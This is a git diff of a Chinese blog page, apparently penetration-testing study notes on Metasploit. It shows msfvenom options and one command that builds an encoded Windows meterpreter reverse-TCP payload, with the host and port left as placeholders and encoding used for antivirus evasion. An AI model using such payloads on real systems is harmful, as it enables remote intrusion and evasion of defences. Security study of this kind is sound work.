@@ -22,12 +22,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"tianlipa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.24.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":16,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="Msfvenom 常用参数 -p  指定payload -f  指定输出格式 -e  指定使用的encoder编码免杀 -a  指定payload的目标架构 -o  保存payload文件输出 -b  设定规避字符集 -n  为payload预先指定一个NOP滑动长度 -s  设定有效攻击载荷的最大长度（文件大小） -i  指定payload的编码次数 -c  指定一个附加的win32 shell">
+    <meta name="description" content="Msfvenom 常用参数 -p  指定 payload -f  指定输出格式 -e  指定使用的 encoder 编码免杀 -a  指定 payload 的目标架构 -o  保存 payload 文件输出 -b  设定规避字符集 -n  为 payload 预先指定一个 NOP 滑动长度 -s  设定有效攻击载荷的最大长度（文件大小） -i  指定 payload 的编码次数 -c  指定一个附">
 <meta property="og:type" content="article">
 <meta property="og:title" content="17-MSF+Combalt Strike">
 <meta property="og:url" content="https://tianlipa.github.io/2025/08/msb-17-metasploit/index.html">
 <meta property="og:site_name" content="tianlipa">
-<meta property="og:description" content="Msfvenom 常用参数 -p  指定payload -f  指定输出格式 -e  指定使用的encoder编码免杀 -a  指定payload的目标架构 -o  保存payload文件输出 -b  设定规避字符集 -n  为payload预先指定一个NOP滑动长度 -s  设定有效攻击载荷的最大长度（文件大小） -i  指定payload的编码次数 -c  指定一个附加的win32 shell">
+<meta property="og:description" content="Msfvenom 常用参数 -p  指定 payload -f  指定输出格式 -e  指定使用的 encoder 编码免杀 -a  指定 payload 的目标架构 -o  保存 payload 文件输出 -b  设定规避字符集 -n  为 payload 预先指定一个 NOP 滑动长度 -s  设定有效攻击载荷的最大长度（文件大小） -i  指定 payload 的编码次数 -c  指定一个附">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-08-13T05:57:37.000Z">
 <meta property="article:modified_time" content="2025-08-13T06:10:00.543Z">
@@ -155,7 +155,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">112</span>
+          <span class="site-state-item-count">119</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -246,21 +246,21 @@
     
     <div class="post-body" itemprop="articleBody"><h2 id="Msfvenom">Msfvenom</h2>
 <h3 id="常用参数">常用参数</h3>
-<p>-p  指定payload<br>
+<p>-p  指定 payload<br>
 -f  指定输出格式<br>
--e  指定使用的encoder编码免杀<br>
--a  指定payload的目标架构<br>
--o  保存payload文件输出<br>
+-e  指定使用的 encoder 编码免杀<br>
+-a  指定 payload 的目标架构<br>
+-o  保存 payload 文件输出<br>
 -b  设定规避字符集<br>
--n  为payload预先指定一个NOP滑动长度<br>
+-n  为 payload 预先指定一个 NOP 滑动长度<br>
 -s  设定有效攻击载荷的最大长度（文件大小）<br>
--i  指定payload的编码次数<br>
--c  指定一个附加的win32 shellcode文件<br>
+-i  指定 payload 的编码次数<br>
+-c  指定一个附加的 win32 shellcode 文件<br>
 -x  指定一个自定义的可执行文件作为模板<br>
--k  保护模板程序的动作，payload作为新的进程运行<br>
+-k  保护模板程序的动作，payload 作为新的进程运行<br>
 -v  指定一个自定义的变量，以确定输出格式</p>
 <span id="more"></span>
-<p>生成一个Windows平台的payload:</p>
+<p>生成一个 Windows 平台的 payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 —platform Windows -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 3 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
 <h2 id="漏洞利用流程">漏洞利用流程</h2>
 
